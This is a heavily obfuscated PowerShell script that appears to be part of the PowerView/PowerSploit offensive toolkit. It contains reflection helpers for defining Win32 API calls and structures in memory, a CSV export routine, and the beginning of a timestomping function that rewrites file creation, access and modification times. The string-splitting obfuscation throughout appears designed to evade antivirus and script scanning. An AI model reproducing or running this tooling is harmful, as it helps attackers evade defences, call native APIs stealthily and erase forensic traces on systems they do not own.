 &("{0}{1}{2}"-f 'Set','-','ITEm')  ("vARIa"+"bLe:0o"+"lUqj")  (  [TYPE]("{1}{0}"-f'iD','GU'));  &("{0}{3}{1}{2}"-f 's','-va','rIaBlE','ET') ("dx7"+"U"+"Mj")  ( [TyPe]("{2}{1}{0}" -f 'in','DOMA','aPp')  );  ${C64d`Tj} =[tYpe]("{4}{2}{1}{6}{3}{5}{0}" -F'iON','ICes.cAl','ntIMe.intERoPsERV','conVeN','RU','t','liNg');   &("{1}{0}" -f '-itEM','Set')  VARiaBle:ZG0 ( [tYpe]("{0}{1}{4}{3}{6}{2}{5}" -f 'rUn','Time.iNTERo','Rse','SERvices.cH','p','T','A') )  ;    ${z8`4N}  =  [tyPE]("{8}{10}{1}{5}{4}{9}{7}{0}{3}{6}{2}" -F 'at','ME.IntERopSER','Te','tRi','.','vICEs','BU','impoRt','R','dLL','Unti'); &('SV') c1JW  (  [TYpe]("{1}{0}{2}{4}{3}"-f'SAt','fLag','tri','uTE','b'));  &("{1}{2}{0}"-f'm','sE','T-itE')  VAriAblE:94T12 ([Type]("{1}{3}{2}{4}{0}"-F'InGsiZe','REFLeC','miT.','TION.e','pACk') ) ; ${I`xh}  =[tyPe]("{2}{4}{3}{6}{1}{0}{5}" -F 'rI','EATT','Re','t','FLECtIon.','BUTES','Yp')  ;${k`dPe}=  [tYpe]("{2}{3}{1}{4}{6}{5}{8}{0}{7}"-f'SATtRib','TiMe.iNT','Ru','N','EROPs','ES.mArShA','ervIC','utE','lA'); &("{0}{2}{1}" -f'S','ITEm','eT-') VARIablE:Ho35 ([tYPE]("{0}{1}" -f'T','YPE') ) ;  &("{1}{2}{0}"-f 'm','se','T-ITe') ("vAr"+"iAbL"+"E"+":8sG")  ( [tYPE]("{5}{2}{0}{1}{3}{4}" -F'IN','t','uNtIme.','eRoPSeRV','icES.MARsHAL','R') );  ${5a`37} = [typE]("{0}{3}{1}{2}" -f 'reFLecTIO','PcODe','S','n.eMIT.o')  ;  &('Sv')  57c ([typE]("{1}{0}" -f'T.dnS','ne')  )  ;  ${9`2m}= [TYpE]("{2}{5}{3}{4}{0}{1}"-F'RegiS','tRyKeY','MI','fT.wi','n32.','crOsO');  &("{1}{2}{0}" -f'ArIAbLE','set-','v')  bew9tP ([tyPe]("{6}{0}{4}{8}{7}{1}{2}{5}{3}" -f'M.','d','iNg','gS','rEFlE','flA','SySTE','n','CtiOn.Bi')) ;    &("{0}{1}" -f 'Set-','IteM')  VARIABLE:aU0Wq  ([TyPe]("{5}{0}{7}{1}{4}{8}{6}{2}{3}" -F 'ystEM.di','v','DOM','aIn','ICEs','S','RECtorY.','rEcToRySEr','.actIvEdi') )  ;&("{0}{2}{1}" -f'SE','M','t-iTe') vaRIAbLE:X4yGJB  ([tyPe]("{7}{8}{9}{1}{5}{3}{6}{12}{11}{0}{10}{2}{4}{13}" -f'ory','sE','O','Ce','RE','RVi','S.actI','s','ysTeM.DIrEc','ToRY','.f','reCt','vEdi','sT')  );&("{2}{1}{0}" -f 'm','tE','SeT-i')  ('vARi'+'a'+'bLE:b78k')  ( [typE]("{0}{1}{4}{3}{2}"-F 'SYst','em.','NcODing','t.e','TeX')) ;    &("{0}{2}{1}"-f 'SE','EM','T-It')  VAriAblE:2odjZ9 (  [TyPE]("{2}{1}{0}{4}{3}" -f'Net','sTEM.','SY','s','.dN') ) ;${s`ia}  = [tyPe]("{1}{0}" -F 'iLe','io.F');   ${c`43j} = [TypE]("{3}{1}{8}{9}{4}{7}{0}{6}{5}{10}{2}" -f'TiOn.RuNsPace','Y','te','s','t.auTOM','ssIONs','s.iNItIalSe','A','ST','Em.MAnagemEn','TA')  ; ${0k`BL}  = [TYpE]("{2}{5}{4}{3}{1}{0}"-F 'rEad','iNG.tH','SYSt','D','ea','Em.THr') ;&("{1}{0}"-f 't','sE')  ('XGnaI'+'b') ([tYpE]("{3}{0}{4}{1}{2}" -f'nsPaCeF','c','TorY','ru','a') )  ;    ${B`7f`IC}=  [tYPE]("{2}{1}{0}" -F 'll','WeRsHe','pO')  ;  &('sV') z3svbN  ( [TYpE]("{0}{3}{1}{2}" -F 'eNvirON','E','nt','m') )  ;&("{2}{1}{0}" -f'Em','T-It','sE')  ("vA"+"riab"+"le"+":5mbI")  (  [tYpE]("{0}{1}"-F'daTEt','Ime') ) ; &("{0}{1}{2}" -f's','ET-iTe','M')  ("VARi"+"able"+":t65Pi")  (  [TYPE]("{4}{7}{2}{1}{5}{0}{3}{6}{8}" -f 'OmatIO','T.aU','nAGeMEn','N.pS','SYsTem.','t','CrEdEntI','mA','aL'))  ;  &("{1}{0}"-f'iTeM','SEt-')  ("Var"+"iabLE:"+"Crgp"+"0")  ( [tYpE]("{0}{1}{2}" -F'iO.dIrE','CToR','y'));  ${lC`Sg}  =  [Type]("{0}{1}"-F 'C','OnverT')  ;   &('Sv') SQg  (  [tYpe]("{0}{1}"-F 'inT','PTr')) ;  &("{0}{1}"-f'SeT-iTe','m') varIaBlE:mp6  ([Type]("{1}{0}"-F'nt32','I') ) ; 











function NeW-`iNme`Mo`RYMOd`UlE
{


    Param
    (
        [Parameter(POSItion = 0)]
        [ValidateNotNullOrEmpty()]
        [String]
        ${MoDu`LEN`AMe} =   ${0`Olu`QJ}::("{1}{2}{0}"-f 'Guid','Ne','w').Invoke().("{1}{0}" -f 'oString','T').Invoke()
    )

    ${lOad`E`d`ASsE`mBlIeS} =  ( &("{0}{1}{2}"-f'chI','lditE','m')  ("vAR"+"iABlE:"+"DX7U"+"mj")  ).value::"Cu`RRe`NTd`OmA`in".("{0}{1}{2}"-f 'GetA','ssem','blies').Invoke()

    ForEach (${As`seMbly} in ${L`O`AD`EDas`SEMBLI`Es}) {
        if (${As`SEMB`ly}."f`ULlN`AME" -and (${AsseMB`ly}."F`UL`lnaMe".("{0}{1}" -f 'S','plit').Invoke(',')[0] -eq ${MO`D`UlENamE})) {
            return ${a`ssE`MBLy}
        }
    }

    ${DynA`sse`m`BLy} = &("{0}{1}{2}"-f'N','ew-Obj','ect') ("{4}{1}{0}{3}{2}" -f 'lect','f','AssemblyName','ion.','Re')(${mOD`U`l`EnAME})
    ${D`omAIn} =  ${d`x7UMj}::"cUrrE`Nt`DomaiN"
    ${a`sS`EmbLy`B`UilDEr} = ${DOm`AIn}.("{3}{1}{4}{0}{2}" -f 'bl','namicAsse','y','DefineDy','m').Invoke(${d`y`NassE`mbLy}, 'Run')
    ${MO`dul`e`BuiLDer} = ${asSEmbL`YB`U`ILd`eR}.("{1}{4}{2}{0}{3}" -f'cM','D','ami','odule','efineDyn').Invoke(${m`OduLe`NAME}, ${fA`l`Se})

    return ${m`OdU`L`eBU`ILder}
}




function F`Unc
{
    Param
    (
        [Parameter(PosITion = 0, mANdaTory = ${T`RuE})]
        [String]
        ${DL`l`Name},

        [Parameter(poSition = 1, ManDaToRy = ${tr`UE})]
        [String]
        ${FUnCTi`ONn`A`mE},

        [Parameter(posITioN = 2, maNdatoRY = ${Tr`Ue})]
        [Type]
        ${rEtu`Rn`TYpe},

        [Parameter(poSitioN = 3)]
        [Type[]]
        ${p`Ar`AM`e`TerTYpEs},

        [Parameter(poSITiON = 4)]
        [Runtime.InteropServices.CallingConvention]
        ${nat`IVecA`l`LinG`cOnVEnTiON},

        [Parameter(PosItIOn = 5)]
        [Runtime.InteropServices.CharSet]
        ${cHA`RsET},

        [Switch]
        ${s`ETLaSTe`RROR}
    )

    ${Pr`O`PeRTieS} = @{
        ("{0}{1}"-f'DllNam','e') = ${d`llNa`me}
        ("{0}{2}{1}{3}" -f 'Functi','nNa','o','me') = ${fUnCt`iO`NnAMe}
        ("{3}{0}{2}{1}"-f 'rnT','pe','y','Retu') = ${re`TURNt`Ype}
    }

    if (${PaRA`meTER`TY`pes}) { ${pR`Op`E`RtIeS}[("{3}{1}{2}{0}" -f'pes','eterT','y','Param')] = ${pA`Ra`m`et`ERtYpEs} }
    if (${n`A`TIVeCAlLing`ConV`enTIOn}) { ${pr`oPErtI`ES}[("{1}{6}{2}{5}{0}{3}{4}" -f 'gCo','N','Calli','nvent','ion','n','ative')] = ${na`TIvec`Alling`cONVe`N`TiOn} }
    if (${C`hAr`sEt}) { ${p`RoPE`RT`IeS}[("{2}{0}{1}" -f 'ha','rset','C')] = ${Cha`RSEt} }
    if (${SETLaSTe`RR`Or}) { ${PRo`p`eR`TieS}[("{1}{3}{2}{0}"-f 'r','SetLa','ro','stEr')] = ${s`ETLasTe`RROR} }

    &("{2}{0}{1}"-f 'w','-Object','Ne') ("{1}{0}{2}"-f 'SObje','P','ct') -Property ${pROPE`Rt`I`ES}
}


function AD`d-`W`iN32TYpE
{


    [OutputType([Hashtable])]
    Param(
        [Parameter(MAnDAtoRy = ${t`RuE}, VAlUeFRoMPipelInEBYPROpErtyName = ${T`RUe})]
        [String]
        ${dlL`NA`Me},

        [Parameter(ManDAtoRY = ${tR`UE}, VaLueFrompIPeliNebyPRopErtYName = ${TR`Ue})]
        [String]
        ${fUnc`Tio`NNA`Me},

        [Parameter(mANDAtoRY = ${TR`UE}, vaLUEFROmPiPElInEbyPropErtynAmE = ${TR`UE})]
        [Type]
        ${ReT`U`R`NtyPe},

        [Parameter(valuEfrOMPipeLiNeBYPrOPertynaMe = ${tr`Ue})]
        [Type[]]
        ${paRam`Et`e`RTYP`es},

        [Parameter(ValuEFRompipeLInebypRoPERtYNAmE = ${T`Rue})]
        [Runtime.InteropServices.CallingConvention]
        ${NATI`V`eC`ALL`in`GcoNVeNT`iOn} =   ( &("{1}{0}" -f'em','IT')  ('vAr'+'iA'+'ble:c'+'64DtJ')  ).vaLUE::"St`DCA`Ll",

        [Parameter(vALuEfRoMPIPEliNEbYPRoPeRtyNaMe = ${tr`UE})]
        [Runtime.InteropServices.CharSet]
        ${ChAr`S`et} =   ( &("{2}{3}{0}{1}"-f'a','blE','GEt-v','aRi') zG0 -VA)::"Au`TO",

        [Parameter(VAlUEfROmpipeLineByPRopERTYNaMe = ${T`RuE})]
        [Switch]
        ${SeTLa`sterR`oR},

        [Parameter(mANdaTORY = ${t`RUe})]
        [ValidateScript({(${_} -is [Reflection.Emit.ModuleBuilder]) -or (${_} -is [Reflection.Assembly])})]
        ${Mo`duLe},

        [ValidateNotNull()]
        [String]
        ${naMe`s`p`AcE} = ''
    )

    BEGIN
    {
        ${t`YPE`hash} = @{}
    }

    PROCESS
    {
        if (${MOdu`lE} -is [Reflection.Assembly])
        {
            if (${nA`mESP`AcE})
            {
                ${T`yPE`HasH}[${d`lLN`Ame}] = ${M`OdUle}.("{0}{2}{1}"-f'Ge','pe','tTy').Invoke("$Namespace.$DllName")
            }
            else
            {
                ${t`Y`PeHa`SH}[${dll`Na`ME}] = ${m`ODU`lE}.("{2}{1}{0}"-f 'e','Typ','Get').Invoke(${DlLN`A`me})
            }
        }
        else
        {
            
            if (!${TYP`eh`AsH}.("{3}{1}{2}{0}" -f 'y','on','tainsKe','C').Invoke(${d`LL`NAMe}))
            {
                if (${N`AmesPA`CE})
                {
                    ${tyP`EHa`sH}[${DLlN`A`ME}] = ${MoD`UlE}.("{2}{1}{0}"-f 'pe','eTy','Defin').Invoke("$Namespace.$DllName", ("{3}{4}{0}{1}{2}"-f 'BeforeFi','eldIn','it','P','ublic,'))
                }
                else
                {
                    ${tYP`eHa`Sh}[${DL`L`NAmE}] = ${MODu`LE}.("{1}{0}{2}"-f 'T','Define','ype').Invoke(${D`l`LnAME}, ("{2}{3}{1}{0}{4}{5}"-f 'c,Befo','bli','P','u','reFie','ldInit'))
                }
            }

            ${met`hoD} = ${tYp`e`hAsH}[${dLL`NamE}].("{2}{0}{3}{1}"-f 'efin','Method','D','e').Invoke(
                ${F`UnCTi`ON`NamE},
                ("{2}{0}{4}{3}{1}" -f'atic,P','mpl','Public,St','keI','invo'),
                ${rE`TUrnt`yPe},
                ${P`ArA`m`EtER`TypeS})

            
            ${I} = 1
            ForEach(${P`AraME`TeR} in ${PaRA`met`ertY`pes})
            {
                if (${p`A`RAmET`er}."I`SB`Yref")
                {
                    [void] ${M`EthoD}.("{0}{2}{1}{3}" -f'De','neParamete','fi','r').Invoke(${i}, 'Out', ${N`UlL})
                }

                ${I}++
            }

            ${dlliM`P`oRt} = [Runtime.InteropServices.DllImportAttribute]
            ${S`ETLASTe`R`RO`RFiElD} = ${d`lLi`mp`Ort}.("{0}{1}" -f 'GetFie','ld').Invoke(("{1}{0}{2}"-f 'etLast','S','Error'))
            ${c`A`l`Li`NGCONve`NtiONF`I`eld} = ${D`lLiMpo`RT}.("{1}{0}{2}"-f'F','Get','ield').Invoke(("{3}{1}{2}{0}" -f 'nvention','g','Co','Callin'))
            ${ch`ArSETFI`elD} = ${DlLI`M`PoRT}.("{0}{1}{2}"-f 'GetF','ie','ld').Invoke(("{0}{2}{1}"-f'C','arSet','h'))
            if (${S`ET`la`SteRr`or}) { ${SL`E`V`AluE} = ${T`Rue} } else { ${sLEVal`Ue} = ${FA`LSe} }

            
            ${c`onst`RUcToR} =  ${z8`4n}."get`cONS`TRuc`T`oR"([String])
            ${D`LLI`m`port`A`TTrIbuTe} = &("{1}{0}{2}" -f'-Obje','New','ct') ("{1}{5}{6}{2}{3}{0}{4}"-f 'ld','Re','u','i','er','flection.Em','it.CustomAttributeB')(${CONS`Tru`CTOr},
                ${Dl`LN`Ame}, [Reflection.PropertyInfo[]] @(), [Object[]] @(),
                [Reflection.FieldInfo[]] @(${SEtL`ASt`ER`R`oRfI`elD}, ${CaLLInGcO`NVeN`TIo`Nfie`LD}, ${Ch`ARs`E`Tf`ield}),
                [Object[]] @(${slEv`A`lue}, ([Runtime.InteropServices.CallingConvention] ${n`A`TiV`ecAlLin`gcon`V`eNTION}), ([Runtime.InteropServices.CharSet] ${Ch`A`RsEt})))

            ${mEt`Hod}.("{2}{0}{4}{3}{1}{5}" -f'etCust','tt','S','A','om','ribute').Invoke(${D`LlI`mporT`ATTR`I`B`UtE})
        }
    }

    END
    {
        if (${MO`duLe} -is [Reflection.Assembly])
        {
            return ${typE`hA`Sh}
        }

        ${rE`TurNt`y`pes} = @{}

        ForEach (${K`Ey} in ${TY`pe`HASh}."k`eYs")
        {
            ${Ty`pe} = ${tYpeh`AsH}[${K`EY}].("{2}{0}{1}"-f 'eT','ype','Creat').Invoke()

            ${re`TuRNTy`pEs}[${K`ey}] = ${ty`pe}
        }

        return ${R`et`UrnTYpes}
    }
}


function Ps`en`Um
{


    [OutputType([Type])]
    Param
    (
        [Parameter(POSITiOn = 0, ManDaTOry = ${tR`UE})]
        [ValidateScript({(${_} -is [Reflection.Emit.ModuleBuilder]) -or (${_} -is [Reflection.Assembly])})]
        ${MOdu`lE},

        [Parameter(PoSITIOn = 1, MANdAtORY = ${T`RUe})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${FULl`N`Ame},

        [Parameter(pOSItIon = 2, mANDaTORY = ${T`Rue})]
        [Type]
        ${Ty`PE},

        [Parameter(posITion = 3, maNDaTORy = ${tR`Ue})]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        ${EnUmE`LeM`ENTS},

        [Switch]
        ${Bi`TF`ielD}
    )

    if (${MOd`U`le} -is [Reflection.Assembly])
    {
        return (${m`oDULe}.("{1}{0}"-f 'Type','Get').Invoke(${F`ULl`N`AmE}))
    }

    ${En`UmTy`PE} = ${T`Ype} -as [Type]

    ${EnuM`BU`ildER} = ${Mo`DU`le}.("{1}{2}{0}"-f'eEnum','Defi','n').Invoke(${f`U`lLNaME}, ("{1}{0}" -f'ic','Publ'), ${e`NumT`ype})

    if (${biTF`iE`Ld})
    {
        ${fLAG`S`coN`s`TrUcTOR} =   ( &("{1}{2}{0}"-f'ABle','V','ARi')  C1JW ).valuE."GE`TCONST`RU`cT`Or"(@())
        ${FL`AG`Sc`UsT`oMAT`TRiButE} = &("{2}{1}{0}"-f'w-Object','e','N') ("{6}{9}{2}{7}{4}{5}{8}{0}{10}{1}{3}"-f 'b','B','ct','uilder','Emit.C','ustomA','Ref','ion.','ttri','le','ute')(${f`lAGS`COnSTRUC`TOr}, @())
        ${eN`UM`BU`ilDER}.("{1}{4}{3}{0}{2}" -f'bu','SetCus','te','Attri','tom').Invoke(${F`lAGSCU`STOMAt`TrIbUTe})
    }

    ForEach (${k`Ey} in ${en`Um`elEMEnTS}."Ke`YS")
    {
        
        ${nU`ll} = ${EnUm`Bu`iLd`Er}."defIN`ELI`TE`Ral"(${k`eY}, ${e`NuME`le`mEn`TS}[${K`ey}] -as ${Enumt`Y`pe})
    }

    ${enUmB`UI`lD`Er}.("{1}{2}{0}{3}" -f'teTyp','Cr','ea','e').Invoke()
}




function F`iELD
{
    Param
    (
        [Parameter(pOsiTiON = 0, MANDAtORY = ${TR`UE})]
        [UInt16]
        ${p`OsIT`iOn},

        [Parameter(pOSItioN = 1, mAndATOry = ${tR`UE})]
        [Type]
        ${t`ype},

        [Parameter(PosItIOn = 2)]
        [UInt16]
        ${O`Ff`Set},

        [Object[]]
        ${maRsH`A`Las}
    )

    @{
        POSITION = ${pOs`ITi`oN}
        ("{0}{1}" -f 'T','ype') = ${ty`Pe} -as [Type]
        ("{1}{0}" -f 'ffset','O') = ${Off`SET}
        ("{1}{0}" -f 'alAs','Marsh') = ${MarS`haL`AS}
    }
}


function St`RUCT
{


    [OutputType([Type])]
    Param
    (
        [Parameter(posiTion = 1, MANDaToRY = ${Tr`Ue})]
        [ValidateScript({(${_} -is [Reflection.Emit.ModuleBuilder]) -or (${_} -is [Reflection.Assembly])})]
        ${MOd`Ule},

        [Parameter(poSItion = 2, MAndaToRy = ${t`RuE})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${Ful`L`Name},

        [Parameter(POsITiOn = 3, mAnDaTOry = ${t`RUE})]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        ${st`RucT`FIElDS},

        [Reflection.Emit.PackingSize]
        ${P`A`CkinGsizE} =  (  &("{2}{0}{1}" -f'A','Ble','Vari')  94T12 ).VALue::"U`Ns`P`EcIfieD",

        [Switch]
        ${e`X`plICI`TlAyOUt}
    )

    if (${mo`DU`lE} -is [Reflection.Assembly])
    {
        return (${MO`Dule}.("{0}{1}" -f 'GetT','ype').Invoke(${f`U`llnAme}))
    }

    [Reflection.TypeAttributes] ${StRUCTAT`T`RIb`UT`eS} = ("{2}{1}{3}{10}{9}{17}{5}{16}{12}{14}{19}{13}{18}{8}{6}{11}{15}{0}{7}{4}" -f 'reFie','las','AnsiC','s,
        ','Init','    ','   ','ld',' ',' Publi','Class,
       ','B','al','  ','ed','efo','  Se','c,
  ','  ',',
')

    if (${E`XplIC`it`LA`YOut})
    {
        ${sTRuC`T`AtT`RibUTeS} = ${St`Ruc`T`ATTRIb`Utes} -bor  (&('lS') VARiabLE:iXh ).vAlUE::"E`XP`LIcItL`AyOUt"
    }
    else
    {
        ${ST`Ru`CTaTt`RIBuTeS} = ${st`RU`cTaT`Tr`ibUt`es} -bor   (  &('Ls') vARIABLe:ixh  ).vAluE::"S`eq`UEnTia`lLAY`o`UT"
    }

    ${s`TrUctbUI`L`d`Er} = ${MOd`ULE}."D`efInet`yPE"(${fULL`N`AmE}, ${S`T`RUCt`ATTr`ibuTeS}, [ValueType], ${pAcki`N`GS`ize})
    ${c`onS`TrUCtOR`iNFo} =  ${k`DPE}.("{0}{4}{3}{1}{2}" -f 'Get','o','rs','t','Construc').Invoke()[0]
    ${si`zeC`onST} = @(  (  &("{0}{1}{2}"-f 'Ge','t-I','tEM') ('variabl'+'e:'+'kDPE')).VAlUe.("{0}{1}" -f'G','etField').Invoke(("{2}{1}{0}" -f'st','eCon','Siz')))

    ${fi`el`dS} = &("{0}{1}{2}" -f 'New-O','bj','ect') ("{3}{1}{2}{0}" -f'[]','hta','ble','Has')(${s`TruCtF`ieLds}."CO`UNt")

    
    
    
    ForEach (${fi`E`Ld} in ${STR`UctF`iel`ds}."K`EyS")
    {
        ${iNd`EX} = ${strUc`T`F`iElds}[${f`IelD}][("{1}{0}" -f 'osition','P')]
        ${fi`eL`Ds}[${i`N`deX}] = @{("{1}{0}{2}"-f'l','Fie','dName') = ${F`ie`ld}; ("{0}{2}{1}" -f 'Pro','es','perti') = ${s`TR`UCtFieLds}[${F`iE`Ld}]}
    }

    ForEach (${f`I`ELd} in ${f`IELdS})
    {
        ${F`ieLdNA`Me} = ${fIE`lD}[("{2}{0}{1}"-f 'dNa','me','Fiel')]
        ${f`I`ELDp`ROP} = ${fi`E`ld}[("{3}{2}{1}{0}" -f'ies','rt','ope','Pr')]

        ${o`FFs`eT} = ${f`IE`LDPRop}[("{2}{1}{0}" -f't','ffse','O')]
        ${T`yPE} = ${FieLdp`R`op}[("{0}{1}" -f'Typ','e')]
        ${m`Ars`hAlAS} = ${FieL`DP`R`oP}[("{2}{1}{0}"-f'lAs','ha','Mars')]

        ${N`E`WfiElD} = ${STruc`TbU`il`der}.("{1}{2}{0}" -f 'ld','Def','ineFie').Invoke(${F`iEld`Name}, ${TY`PE}, ("{0}{1}" -f 'Pub','lic'))

        if (${MAR`Sha`LaS})
        {
            ${u`N`MaNag`ED`TYPe} = ${MarSHa`L`AS}[0] -as ([Runtime.InteropServices.UnmanagedType])
            if (${MArS`Ha`LAs}[1])
            {
                ${sI`ze} = ${ma`RSHaL`AS}[1]
                ${a`Ttr`ibBu`IldER} = &("{0}{1}{2}" -f 'New-O','bj','ect') ("{1}{6}{10}{2}{0}{9}{5}{3}{8}{7}{4}"-f'mit','Ref','n.E','t','uilder','CustomAt','lecti','teB','ribu','.','o')(${c`oNSt`R`Uc`TorInfO},
                    ${Unm`A`N`AGedtYpE}, ${s`IZE`CoNSt}, @(${sI`zE}))
            }
            else
            {
                ${A`T`T`RIbBUIld`er} = &("{1}{2}{0}" -f 'w-Object','N','e') ("{2}{9}{5}{7}{3}{4}{0}{1}{8}{10}{6}" -f 'mAt','tr','Reflec','.','Custo','.Em','r','it','ibute','tion','Builde')(${c`oNStRucto`RI`NFo}, [Object[]] @(${un`manaG`ed`Type}))
            }

            ${nEWf`Ie`LD}.("{3}{1}{2}{0}"-f'te','tomA','ttribu','SetCus').Invoke(${A`TtRI`BBui`l`DeR})
        }

        if (${expLiCi`T`La`yOuT}) { ${nEW`F`IElD}.("{0}{2}{1}"-f 'SetOff','t','se').Invoke(${O`Ff`SeT}) }
    }

    
    
    ${s`Ize`MeTHod} = ${StrUc`T`Bu`i`lder}.("{0}{2}{1}{3}"-f 'D','et','efineM','hod').Invoke(("{0}{1}"-f 'GetS','ize'),
        ("{1}{0}{2}{3}" -f 'l','Pub','ic, ','Static'),
        [Int],
        [Type[]] @())
    ${i`lGE`NERAt`Or} = ${s`iZEMe`ThOd}.("{2}{0}{3}{1}" -f 'etILG','ator','G','ener').Invoke()
    
    ${i`lgE`Nerator}."E`mIT"( (  &("{1}{0}" -f'tEM','i') VarIAble:5A37 ).VaLue::"l`DToK`en", ${S`TRUCTBui`ldER})
    ${ILgENe`Ra`T`Or}."em`it"( (&('LS') ("VarIAble:"+"5a3"+"7")  ).valUe::"ca`Ll",
         (&("{2}{0}{1}"-f 'IABL','e','VaR') ('hO3'+'5') -ValueO).("{1}{0}{2}" -f'e','GetM','thod').Invoke(("{0}{1}{2}{3}" -f'GetType','Fro','mHand','le')))
    ${I`L`GEneR`AtOr}."eM`IT"( ${5`A37}::"c`ALL",
         ( &("{0}{1}"-f 'G','Ci')  ("vA"+"rIa"+"BlE:8Sg") ).vaLUe.("{2}{1}{0}"-f 'd','ho','GetMet').Invoke(("{0}{1}"-f 'Si','zeOf'), [Type[]] @([Type])))
    ${iL`g`eNErat`Or}."e`MIt"(  (  &("{0}{1}" -f'vaRi','AblE') ("5"+"A37")).ValUE::"R`eT")

    
    
    ${ImPLiC`IT`COn`VeRter} = ${Str`U`ct`B`UIldER}.("{0}{2}{1}" -f'Def','hod','ineMet').Invoke(("{0}{1}{2}"-f'o','p_Impl','icit'),
        ("{2}{14}{5}{4}{10}{3}{1}{9}{12}{7}{6}{13}{11}{0}{8}" -f'a','tatic,','Pr',', S',',','e',' Sp',',','me',' Hide',' Public','ialN','BySig','ec','ivateScop'),
        ${S`TR`UC`Tb`UIldER},
        [Type[]] @([IntPtr]))
    ${ilg`eN`ErAto`R2} = ${IM`PLicitc`ON`VerTer}.("{1}{2}{0}"-f 'rator','GetI','LGene').Invoke()
    ${IlgeNE`RA`T`or2}."E`mit"(  (  &("{2}{3}{1}{0}" -f 'em','t','GEt-chILD','i') ("vaRIA"+"Bl"+"e:5a"+"37") ).vALue::"N`OP")
    ${iL`geNeRATo`R2}."E`MiT"(  (  &("{0}{2}{3}{1}" -f 'geT-vARi','le','a','B')  ('5'+'A37')  -ValUeoNl )::"Ld`Ar`g_0")
    ${IlgeNe`RaTo`R2}."EM`it"( ( &("{1}{0}{2}"-f'B','GET-vARIa','le') 5a37).vaLUE::"LDtO`K`En", ${STRu`c`T`BUIlDer})
    ${i`LGEn`E`RaT`OR2}."e`Mit"( ${5A`37}::"ca`lL",
          ( &("{1}{0}" -f'tEm','i') vaRiaBLe:ho35 ).vALue.("{0}{2}{1}"-f 'GetMe','hod','t').Invoke(("{1}{2}{3}{4}{0}" -f'le','GetType','Fro','m','Hand')))
    ${I`l`GeNerAtOR2}."e`Mit"( (&("{3}{2}{1}{0}"-f'Tem','Ldi','i','Ch') ('VariABl'+'e:'+'5a'+'37') ).valUe::"c`All",
         ${8`SG}.("{0}{1}{2}"-f 'G','etMetho','d').Invoke(("{1}{2}{0}{3}" -f'r','PtrToStruc','tu','e'), [Type[]] @([IntPtr], [Type])))
    ${ILg`eNe`RATO`R2}."e`mit"( ( &("{1}{0}{3}{2}"-f'-','gET','AbLe','VAri')  ('5'+'A37') -VaLUEO)::"Unbox`_AnY", ${StrU`CtbU`i`lDeR})
    ${I`LG`enE`RatOr2}."e`MiT"( ${5a`37}::"r`et")

    ${S`TRuCT`BuiLd`Er}.("{0}{2}{1}" -f'Cr','Type','eate').Invoke()
}








function Ex`P`Ort-p`owERVIewcSv {

    Param(
        [Parameter(MAnDatory=${T`Rue}, valuEFRoMPIPeLiNe=${t`RuE},
        ValUEFROMPiPelinEByProPERTyNamE=${tr`Ue})]
        [System.Management.Automation.PSObject]
        ${i`N`puTobjEcT},

        [Parameter(MANdaToRy=${t`RUE}, pOsiTion=0)]
        [Alias({"{2}{0}{1}"-f'SPat','h','P'})]
        [String]
        ${o`U`TfILE}
    )

    process {
        
        ${o`Bje`CTCsV} = ${i`Nput`obJe`Ct} | &("{2}{0}{1}{3}" -f 'nve','rtTo-','Co','Csv') -NoTypeInformation

        
        ${M`UtEX} = &("{2}{1}{0}"-f 'bject','ew-O','N') ("{5}{1}{4}{0}{2}{3}" -f 'ng','stem.Thre','.','Mutex','adi','Sy') ${f`A`lsE},{"{2}{0}{1}" -f'SVMu','tex','C'};
        ${n`UlL} = ${MuT`EX}.("{0}{2}{1}"-f 'Wait','ne','O').Invoke()

        if (&("{2}{0}{1}{3}"-f 't-P','at','Tes','h') -Path ${OU`TfI`le}) {
            
            ${oB`J`E`cTcsv} | &("{0}{2}{1}{3}" -f'Foreach-','bjec','O','t') {${s`T`ART}=${t`Rue}}{if (${sta`RT}) {${St`ARt}=${fA`LsE}} else {${_}}} | &("{0}{2}{1}"-f'Out','File','-') -Encoding ("{0}{1}" -f'ASCI','I') -Append -FilePath ${o`Ut`FilE}
        }
        else {
            ${OB`jEc`TC`sV} | &("{2}{1}{0}" -f 'ile','t-F','Ou') -Encoding ("{1}{0}" -f'CII','AS') -Append -FilePath ${o`U`Tfile}
        }

        ${MU`TEX}.("{3}{1}{2}{0}" -f 'ex','easeM','ut','Rel').Invoke()
    }
}



function sET`-M`ACATT`RiBUte {

    [CmdletBinding(DeFaultpARamEteRSetNAmE = {"{0}{1}"-f 'To','uch'})]
    Param (

        [Parameter(POSItIoN = 1,maNdAtory = ${t`RUE})]
        [ValidateScript({&("{1}{0}{2}"-f'est-','T','Path') -Path ${_} })]
        [String]
        ${fI`LEpaTh},

        [Parameter(PARAMeTERSeTnAme = "to`UCH")]
        [ValidateScript({&("{2}{1}{0}" -f'ath','st-P','Te') -Path ${_} })]
        [String]
        ${O`ld`FIl`EpATh},

        [Parameter(pArAMeteRSetnaME = "iNDi`V`iDuAl")]
        [DateTime]
        ${mOD`If`ied},

        [Parameter(ParAmETersetNAme = "In`dIVI`DuaL")]
        [DateTime]
        ${Acc`esS`eD},

        [Parameter(paraMETERsetNAME = "in`D`IViDUAL")]
        [DateTime]
        ${CREA`Ted},

        [Parameter(PArameteRSEtnAME = 'All')]
        [DateTime]
        ${ALLmACa`T`TR`Ibutes}
    )

    
    function G`Et-MACaTt`R`IBuTE {

        param(${OLDF`iLeNa`me})

        if (!(&("{0}{1}{2}"-f 'Te','st-Pa','th') -Path ${O`ldFilEN`A`ME})) {Throw ("{0}{2}{3}{1}"-f'File',' Found',' ','Not')}
        ${fIlEInfo`objE`CT} = (&("{0}{2}{1}"-f 'Get','Item','-') ${o`LDF`i`Lename})

        ${OBJEC`Tp`R`OPe`Rt`IES} = @{("{0}{2}{1}"-f'Mo','fied','di') = (${fIleINFo`OB`jE`Ct}."la`stwrIt`etiME");
                              ("{2}{1}{0}" -f 'ssed','ce','Ac') = (${fIleInF`O`Ob`JEcT}."LA`STacCESst`imE");
                              ("{0}{1}{2}"-f 'Cre','a','ted') = (${FiL`eiN`FOOBJ`E`ct}."CrE`ATi`OnTI`Me")};
        ${REsul`Tobj`E`cT} = &("{1}{0}{2}"-f 'w-Obje','Ne','ct') -TypeName ("{1}{0}{2}"-f 'O','PS','bject') -Property ${o`BJE`CtPRo`p`e`RTIes}
        Return ${Re`SULto`BjEct}
    }

